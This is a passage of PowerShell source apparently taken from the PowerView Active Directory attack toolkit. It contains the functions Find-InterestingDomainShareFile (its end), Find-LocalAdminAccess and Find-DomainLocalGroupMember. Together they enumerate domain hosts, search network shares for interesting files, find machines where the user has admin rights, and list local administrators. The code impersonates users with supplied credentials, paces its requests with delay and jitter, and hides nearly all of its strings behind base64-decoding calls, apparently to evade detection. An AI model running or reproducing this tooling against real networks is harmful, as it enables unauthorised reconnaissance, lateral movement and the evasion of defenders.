        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)
            if ($TokenHandle) {
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                if ($ExcludedShares -NotContains $ShareName) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $SearchShares) {
                    Write-Verbose "Searching share: $Share"
                    $SearchArgs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABBAGMAYwBlAHMAcwBUAGkAbQBlAA==')))] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $LogonToken = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"
            $ScriptParams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Find-LocalAdminAccess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)
            if ($TokenHandle) {
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $LogonToken = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"
            $ScriptParams = @{
                'TokenHandle' = $LogonToken
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}
function Find-DomainLocalGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)
            if ($GroupName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($TokenHandle) {
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        'ComputerName' = $TargetComputer
                        'Method' = $Method
                        'GroupName' = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $LogonToken = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"
            $ScriptParams = @{
                'GroupName' = $GroupName
                'Method' = $Method
                'TokenHandle' = $LogonToken
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-DomainTrust {
